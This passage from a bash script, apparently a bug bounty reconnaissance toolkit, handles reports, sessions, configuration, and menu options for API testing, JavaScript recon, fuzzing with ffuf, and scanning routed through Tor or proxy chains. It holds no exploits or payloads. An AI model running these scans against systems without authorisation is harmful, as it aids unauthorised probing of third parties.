  "session": "$(basename "$OUTPUT_DIR")",
  "scan_date": "$(date -Iseconds)",
  "toolkit_version": "3.0",
  "results": {
EOF
    
    # Add subdomains
    echo '    "subdomains": [' >> "$json_report"
    if [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ]; then
        while IFS= read -r subdomain; do
            echo "      \"$subdomain\"," >> "$json_report"
        done < "$OUTPUT_DIR/subdomains/all_subdomains.txt"
        # Remove last comma
        sed -i '$ s/,$//' "$json_report"
    fi
    echo '    ],' >> "$json_report"
    
    # Add statistics
    local subdomain_count=0
    local live_count=0
    local vuln_count=0
    
    [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && subdomain_count=$(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")
    [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && live_count=$(wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" 2>/dev/null || echo "0")
    [ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && vuln_count=$(wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" 2>/dev/null || echo "0")
    
    cat >> "$json_report" << EOF
    "statistics": {
      "total_subdomains": $subdomain_count,
      "live_subdomains": $live_count,
      "vulnerabilities_found": $vuln_count
    }
  }
}
EOF
    
    success_msg "JSON report generated: $json_report"
}

# Export to CSV
export_csv() {
    if [ -z "$OUTPUT_DIR" ] || [ ! -d "$OUTPUT_DIR" ]; then
        warn_msg "No active session to export"
        return
    fi
    
    info_msg "Exporting results to CSV format"
    
    local csv_file="$OUTPUT_DIR/reports/results.csv"
    
    echo "Type,Target,Status,Details,Timestamp" > "$csv_file"
    
    # Export subdomains
    if [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ]; then
        while IFS= read -r subdomain; do
            echo "Subdomain,$subdomain,Discovered,,$(date -Iseconds)" >> "$csv_file"
        done < "$OUTPUT_DIR/subdomains/all_subdomains.txt"
    fi
    
    # Export live subdomains
    if [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ]; then
        while IFS= read -r live_subdomain; do
            echo "Live Host,$live_subdomain,Active,,$(date -Iseconds)" >> "$csv_file"
        done < "$OUTPUT_DIR/subdomains/live_subdomains.txt"
    fi
    
    success_msg "CSV export completed: $csv_file"
}

# Compare Sessions
compare_sessions() {
    echo -e "\n${CYAN}[*] Session Comparison${NC}"
    
    local sessions=()
    while IFS= read -r -d '' session; do
        sessions+=("$(basename "$session")")
    done < <(find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -print0 2>/dev/null)
    
    if [ ${#sessions[@]} -lt 2 ]; then
        warn_msg "Need at least 2 sessions to compare"
        return
    fi
    
    echo "Available sessions:"
    local i=1
    for session in "${sessions[@]}"; do
        echo "$i. $session"
        ((i++))
    done
    
    read -p "Select first session (number): " session1_num
    read -p "Select second session (number): " session2_num
    
    if [[ "$session1_num" =~ ^[0-9]+$ ]] && [[ "$session2_num" =~ ^[0-9]+$ ]]; then
        local session1="${sessions[$((session1_num-1))]}"
        local session2="${sessions[$((session2_num-1))]}"
        
        local compare_file="$RESULTS_DIR/comparison_$(date +%Y%m%d_%H%M%S).txt"
        
        {
            echo "=== SESSION COMPARISON ==="
            echo "Session 1: $session1"
            echo "Session 2: $session2"
            echo "Generated: $(date)"
            echo ""
            
            echo "=== NEW SUBDOMAINS IN SESSION 2 ==="
            if [ -f "$RESULTS_DIR/$session1/subdomains/all_subdomains.txt" ] && [ -f "$RESULTS_DIR/$session2/subdomains/all_subdomains.txt" ]; then
                comm -13 <(sort "$RESULTS_DIR/$session1/subdomains/all_subdomains.txt") <(sort "$RESULTS_DIR/$session2/subdomains/all_subdomains.txt")
            fi
            
            echo ""
            echo "=== REMOVED SUBDOMAINS IN SESSION 2 ==="
            if [ -f "$RESULTS_DIR/$session1/subdomains/all_subdomains.txt" ] && [ -f "$RESULTS_DIR/$session2/subdomains/all_subdomains.txt" ]; then
                comm -23 <(sort "$RESULTS_DIR/$session1/subdomains/all_subdomains.txt") <(sort "$RESULTS_DIR/$session2/subdomains/all_subdomains.txt")
            fi
            
        } > "$compare_file"
        
        success_msg "Session comparison saved: $compare_file"
    else
        warn_msg "Invalid session selection"
    fi
}

# Archive Results
archive_results() {
    info_msg "Archiving old results"
    
    local archive_dir="$RESULTS_DIR/archive"
    mkdir -p "$archive_dir"
    
    # Archive sessions older than 30 days
    find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -mtime +30 -exec mv {} "$archive_dir/" \;
    
    # Compress archived results
    if [ "$(ls -A "$archive_dir" 2>/dev/null)" ]; then
        local archive_file="archived_results_$(date +%Y%m%d).tar.gz"
        tar -czf "$archive_file" -C "$archive_dir" .
        rm -rf "$archive_dir"/*
        mv "$archive_file" "$archive_dir/"
        success_msg "Results archived to: $archive_dir/$archive_file"
    else
        info_msg "No old results to archive"
    fi
}

# Clean Old Results
clean_old_results() {
    echo -e "\n${YELLOW}[!] This will permanently delete old scan results${NC}"
    read -p "Delete results older than how many days? (default: 60): " days
    days=${days:-60}
    
    read -p "Are you sure you want to delete results older than $days days? (y/N): " confirm
    
    if [[ $confirm =~ ^[Yy]$ ]]; then
        local deleted_count=0
        while IFS= read -r -d '' old_dir; do
            rm -rf "$old_dir"
            ((deleted_count++))
        done < <(find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -mtime +"$days" -print0 2>/dev/null)
        
        success_msg "Deleted $deleted_count old result directories"
    else
        info_msg "Cleanup cancelled"
    fi
}

# View Statistics
view_statistics() {
    echo -e "\n${CYAN}[*] Bug Bounty Toolkit Statistics${NC}"
    echo ""
    
    # Count total sessions
    local total_sessions=0
    while IFS= read -r -d '' session; do
        ((total_sessions++))
    done < <(find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -print0 2>/dev/null)
    
    echo "Total Sessions: $total_sessions"
    
    # Count total subdomains across all sessions
    local total_subdomains=0
    while IFS= read -r -d '' subdomain_file; do
        local count=$(wc -l < "$subdomain_file" 2>/dev/null || echo "0")
        total_subdomains=$((total_subdomains + count))
    done < <(find "$RESULTS_DIR" -name "all_subdomains.txt" -print0 2>/dev/null)
    
    echo "Total Subdomains Found: $total_subdomains"
    
    # Disk usage
    local disk_usage=$(du -sh "$RESULTS_DIR" 2>/dev/null | cut -f1)
    echo "Disk Usage: $disk_usage"
    
    # Most active targets
    echo ""
    echo "=== Most Scanned Targets ==="
    find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" 2>/dev/null | sed 's/.*\///; s/_[0-9]\{8\}_[0-9]\{6\}$//' | sort | uniq -c | sort -nr | head -5
    
    # Recent activity
    echo ""
    echo "=== Recent Sessions ==="
    find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -printf "%T@ %Tc %p\n" 2>/dev/null | sort -nr | head -5 | while read timestamp date_str path; do
        echo "$(basename "$path") - $date_str"
    done
}

# Email Report
email_report() {
    if [ -z "$OUTPUT_DIR" ] || [ ! -d "$OUTPUT_DIR" ]; then
        warn_msg "No active session to email"
        return
    fi
    
    read -p "Enter email address: " email_address
    
    if [[ "$email_address" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        local report_file="$OUTPUT_DIR/reports/full_report.html"
        
        if [ -f "$report_file" ]; then
            # Create email with mutt if available
            if command -v mutt &> /dev/null; then
                echo "Bug bounty scan results for $TARGET" | mutt -s "Security Assessment Results - $TARGET" -a "$report_file" -- "$email_address"
                success_msg "Report emailed to: $email_address"
            else
                warn_msg "Mutt not installed. Please install mutt for email functionality."
                info_msg "Alternative: Use 'scp $report_file user@server:' to transfer the report"
            fi
        else
            warn_msg "No HTML report found. Generate one first."
        fi
    else
        warn_msg "Invalid email address format"
    fi
}
# Edit Threading Settings
edit_threading() {
    echo -e "\n${YELLOW}[*] Threading Configuration${NC}"
    echo "Current thread count: ${DEFAULT_THREADS:-50}"
    read -p "Enter new thread count (1-200): " new_threads
    
    if [[ "$new_threads" =~ ^[0-9]+$ ]] && [ "$new_threads" -ge 1 ] && [ "$new_threads" -le 200 ]; then
        sed -i "s/DEFAULT_THREADS=.*/DEFAULT_THREADS=$new_threads/" "$CONFIG_FILE"
        DEFAULT_THREADS="$new_threads"
        success_msg "Thread count updated to: $new_threads"
    else
        warn_msg "Invalid thread count. Must be between 1 and 200."
    fi
}

# Configure Timeouts
configure_timeouts() {
    echo -e "\n${YELLOW}[*] Timeout Configuration${NC}"
    echo "Current timeout: ${DEFAULT_TIMEOUT:-30} seconds"
    read -p "Enter new timeout in seconds (5-300): " new_timeout
    
    if [[ "$new_timeout" =~ ^[0-9]+$ ]] && [ "$new_timeout" -ge 5 ] && [ "$new_timeout" -le 300 ]; then
        sed -i "s/DEFAULT_TIMEOUT=.*/DEFAULT_TIMEOUT=$new_timeout/" "$CONFIG_FILE"
        DEFAULT_TIMEOUT="$new_timeout"
        success_msg "Timeout updated to: $new_timeout seconds"
    else
        warn_msg "Invalid timeout. Must be between 5 and 300 seconds."
    fi
}

# Set Default Wordlists
set_wordlists() {
    echo -e "\n${YELLOW}[*] Wordlist Configuration${NC}"
    echo "Current wordlist directory: ${WORDLIST_DIR:-/usr/share/wordlists}"
    echo ""
    echo "1. Use SecLists directory"
    echo "2. Use custom directory"
    echo "3. Download and set up wordlists"
    
    read -p "Select option: " wordlist_choice
    
    case $wordlist_choice in
        1)
            if [ -d "/usr/share/wordlists/SecLists" ]; then
                sed -i "s|WORDLIST_DIR=.*|WORDLIST_DIR=\"/usr/share/wordlists/SecLists\"|" "$CONFIG_FILE"
                WORDLIST_DIR="/usr/share/wordlists/SecLists"
                success_msg "Wordlist directory set to SecLists"
            else
                warn_msg "SecLists not found. Please download first."
            fi
            ;;
        2)
            read -p "Enter custom wordlist directory path: " custom_wordlist_dir
            if [ -d "$custom_wordlist_dir" ]; then
                sed -i "s|WORDLIST_DIR=.*|WORDLIST_DIR=\"$custom_wordlist_dir\"|" "$CONFIG_FILE"
                WORDLIST_DIR="$custom_wordlist_dir"
                success_msg "Wordlist directory set to: $custom_wordlist_dir"
            else
                warn_msg "Directory does not exist: $custom_wordlist_dir"
            fi
            ;;
        3)
            configure_wordlists
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Notification Settings
notification_settings() {
    echo -e "\n${YELLOW}[*] Notification Configuration${NC}"
    echo "1. Email notifications"
    echo "2. Slack notifications"
    echo "3. Discord notifications"
    echo "4. Desktop notifications"
    
    read -p "Select notification type: " notif_choice
    
    case $notif_choice in
        1)
            read -p "Enter email for notifications: " notif_email
            echo "NOTIFICATION_EMAIL=\"$notif_email\"" >> "$CONFIG_FILE"
            success_msg "Email notifications configured"
            ;;
        2)
            read -p "Enter Slack webhook URL: " slack_webhook
            echo "SLACK_WEBHOOK=\"$slack_webhook\"" >> "$CONFIG_FILE"
            success_msg "Slack notifications configured"
            ;;
        3)
            read -p "Enter Discord webhook URL: " discord_webhook
            echo "DISCORD_WEBHOOK=\"$discord_webhook\"" >> "$CONFIG_FILE"
            success_msg "Discord notifications configured"
            ;;
        4)
            echo "DESKTOP_NOTIFICATIONS=true" >> "$CONFIG_FILE"
            success_msg "Desktop notifications enabled"
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Export Configuration
export_config() {
    local export_file="bug_bounty_config_$(date +%Y%m%d_%H%M%S).conf"
    cp "$CONFIG_FILE" "$export_file"
    
    # Add system info
    {
        echo ""
        echo "# Exported configuration"
        echo "# Date: $(date)"
        echo "# System: $(uname -a)"
        echo "# Toolkit Version: 3.0"
    } >> "$export_file"
    
    success_msg "Configuration exported to: $export_file"
}

# Import Configuration
import_config() {
    echo "Available configuration files:"
    ls -la *.conf 2>/dev/null || echo "No .conf files found in current directory"
    
    read -p "Enter configuration file to import: " import_file
    
    if [ -f "$import_file" ]; then
        # Backup current config
        cp "$CONFIG_FILE" "${CONFIG_FILE}.backup.$(date +%Y%m%d_%H%M%S)"
        
        # Import new config
        cp "$import_file" "$CONFIG_FILE"
        
        # Reload configuration
        load_config
        
        success_msg "Configuration imported from: $import_file"
        info_msg "Previous configuration backed up"
    else
        warn_msg "Configuration file not found: $import_file"
    fi
}

# Reset Configuration
reset_config() {
    echo -e "\n${RED}[!] This will reset all configuration to defaults${NC}"
    read -p "Are you sure? (y/N): " confirm_reset
    
    if [[ $confirm_reset =~ ^[Yy]$ ]]; then
        # Backup current config
        cp "$CONFIG_FILE" "${CONFIG_FILE}.backup.$(date +%Y%m%d_%H%M%S)"
        
        # Create default config
        cat > "$CONFIG_FILE" << EOF
# Bug Bounty Toolkit Configuration - Reset to defaults
# Date: $(date)
DEFAULT_THREADS=50
DEFAULT_TIMEOUT=30
DEFAULT_DELAY=1
WORDLIST_DIR="/usr/share/wordlists"
NUCLEI_TEMPLATES_DIR="\$HOME/nuclei-templates"
OUTPUT_FORMAT="both"
ENABLE_SCREENSHOTS=true
AUTO_ORGANIZE=true
EOF
        
        # Reload configuration
        load_config
        
        success_msg "Configuration reset to defaults"
        info_msg "Previous configuration backed up"
    else
        info_msg "Reset cancelled"
    fi
}

# Swagger/API Testing function
swagger_api_testing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting Swagger/API testing for $TARGET"
    
    if [ -f "$SCRIPT_DIR/swagger.sh" ]; then
        cd "$OUTPUT_DIR/vulns"
        bash "$SCRIPT_DIR/swagger.sh" -t "https://$TARGET" --timeout 30 -v
        cd - > /dev/null
        success_msg "Swagger/API testing completed"
    else
        warn_msg "Swagger testing script not found"
        # Manual API endpoint discovery
        local api_output="$OUTPUT_DIR/vulns/api_endpoints.txt"
        cat > "$api_output" << 'EOF'
Common API endpoints to test manually:
/api/
/api/v1/
/api/v2/
/swagger/
/swagger-ui/
/docs/
/documentation/
/graphql/
/graphiql/
EOF
        success_msg "Manual API endpoint list created: $api_output"
    fi
}

# JavaScript Reconnaissance function
javascript_recon() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting JavaScript reconnaissance for $TARGET"
    
    if [ -f "$SCRIPT_DIR/js_recon.sh" ]; then
        cd "$OUTPUT_DIR/urls"
        bash "$SCRIPT_DIR/js_recon.sh" "$TARGET"
        cd - > /dev/null
        success_msg "JavaScript reconnaissance completed"
    else
        warn_msg "JavaScript recon script not found"
        # Manual JS file discovery
        local js_output="$OUTPUT_DIR/urls/javascript_files.txt"
        {
            echo "Manual JavaScript file discovery for $TARGET:"
            echo "https://$TARGET/assets/js/"
            echo "https://$TARGET/static/js/"
            echo "https://$TARGET/js/"
            echo "https://$TARGET/scripts/"
            echo "https://$TARGET/app.js"
            echo "https://$TARGET/main.js"
            echo "https://$TARGET/bundle.js"
        } > "$js_output"
        success_msg "Manual JS discovery list created: $js_output"
    fi
}

# Anonymous Reconnaissance function
anonymous_recon() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    echo -e "\n${YELLOW}[*] Anonymous Reconnaissance Options:${NC}"
    echo "1. Use Tor network"
    echo "2. Use proxy chains"
    echo "3. Standard anonymous mode"
    
    read -p "Select anonymity option: " anon_choice
    
    local anon_flag=""
    case $anon_choice in
        1) anon_flag="--tor" ;;
        2) anon_flag="--proxy" ;;
        3) anon_flag="" ;;
        *) warn_msg "Invalid selection"; return ;;
    esac
    
    info_msg "Starting anonymous reconnaissance for $TARGET"
    
    if [ -f "$SCRIPT_DIR/anon_recon.sh" ]; then
        cd "$OUTPUT_DIR"
        bash "$SCRIPT_DIR/anon_recon.sh" "$TARGET" $anon_flag
        cd - > /dev/null
        success_msg "Anonymous reconnaissance completed"
    else
        warn_msg "Anonymous recon script not found"
        info_msg "Running standard reconnaissance with privacy considerations"
        # Use standard recon but with delays and user agent rotation
        export USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        subdomain_enumeration
        sleep 5
        dns_analysis
        success_msg "Privacy-conscious reconnaissance completed"
    fi
}

# Advanced Fuzzing function
advanced_fuzzing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    echo -e "\n${YELLOW}[*] Advanced Fuzzing Options:${NC}"
    echo "1. Directory/File fuzzing"
    echo "2. Parameter fuzzing"
    echo "3. Subdomain fuzzing"
    echo "4. Custom fuzzing"
    
    read -p "Select fuzzing type: " fuzz_choice
    
    case $fuzz_choice in
        1)
            info_msg "Starting directory/file fuzzing for $TARGET"
            if [ -f "$SCRIPT_DIR/kfuzzer.sh" ]; then
                bash "$SCRIPT_DIR/kfuzzer.sh" "https://$TARGET"
            else
                directory_fuzzing
            fi
            ;;
        2)
            info_msg "Starting parameter fuzzing for $TARGET"
            parameter_discovery
            ;;
        3)
            info_msg "Starting subdomain fuzzing for $TARGET"
            subdomain_enumeration
            ;;
        4)
            read -p "Enter custom fuzzing target URL: " custom_url
            read -p "Enter wordlist path: " wordlist_path
            if [ -f "$wordlist_path" ]; then
                if command -v ffuf &> /dev/null; then
                    ffuf -u "$custom_url/FUZZ" -w "$wordlist_path" -o "$OUTPUT_DIR/vulns/custom_fuzz.txt"
                    success_msg "Custom fuzzing completed"
                else
                    warn_msg "ffuf not available for custom fuzzing"
                fi
            else
                warn_msg "Wordlist not found: $wordlist_path"
            fi
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Initialize
init() {
    log_action "Bug Bounty Toolkit started"
    check_dependencies
    load_config
    
    # Check if resuming previous session
    if [ -f "$SCRIPT_DIR/.last_session" ]; then
        local last_session=$(cat "$SCRIPT_DIR/.last_session")
        if [ -d "$last_session" ]; then
            echo -e "${YELLOW}[*] Previous session found: $(basename "$last_session")${NC}"
            read -p "$(echo -e "${BLUE}[+] Resume previous session? (y/N): ${NC}")" resume
            if [[ $resume =~ ^[Yy]$ ]]; then
                OUTPUT_DIR="$last_session"
                # Extract target from session directory name
                local session_name=$(basename "$last_session")
                TARGET=$(echo "$session_name" | sed 's/_[0-9]\{8\}_[0-9]\{6\}$//')
                info_msg "Resumed session: $session_name"
            fi
        fi
    fi
}

# Cleanup on exit
cleanup() {
    log_action "Bug Bounty Toolkit exited"
}

# Signal handling
trap cleanup EXIT

# Main execution
main() {
    init
    main_menu
}

# Handle command line arguments for automation
if [ "$1" = "automated_daily" ] || [ "$1" = "automated_weekly" ] || [ "$1" = "automated_monthly" ] || [ "$1" = "automated_custom" ]; then
    # Automated scan mode
    info_msg "Running automated scan: $1"
    
    # Use last target or default
    if [ -f "$SCRIPT_DIR/.last_target" ]; then
        TARGET=$(cat "$SCRIPT_DIR/.last_target")
        create_session_dir
        
        case $1 in
            "automated_daily")
                quick_scan
                ;;
            "automated_weekly")
                standard_scan
                ;;
            "automated_monthly")
                comprehensive_scan
                ;;
            "automated_custom")
                # Custom automated workflow
                if [ -f "$SCRIPT_DIR/.custom_workflow" ]; then
                    source "$SCRIPT_DIR/.custom_workflow"
                else
                    quick_scan
                fi
                ;;
        esac
        
        # Send notification if configured
        if [ -n "$NOTIFICATION_EMAIL" ]; then
            generate_html_report
            echo "Automated scan completed for $TARGET" | mail -s "Bug Bounty Scan Complete" "$NOTIFICATION_EMAIL"
        fi
    else
        warn_msg "No target configured for automated scan"
    fi
else
    # Interactive mode
    main "$@"
fi